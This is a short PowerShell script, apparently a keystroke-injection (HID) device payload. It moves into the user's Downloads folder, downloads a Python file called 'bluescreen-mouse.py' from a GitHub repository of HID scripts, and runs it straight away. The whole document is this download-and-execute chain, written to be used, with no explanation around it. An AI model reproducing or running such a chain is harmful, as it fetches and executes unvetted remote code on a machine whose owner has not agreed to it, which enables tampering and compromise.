cd "$env:USERPROFILE\Downloads"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/Bluescreen-mouse/bluescreen-mouse.py" -OutFile blue.py

python.exe blue.py
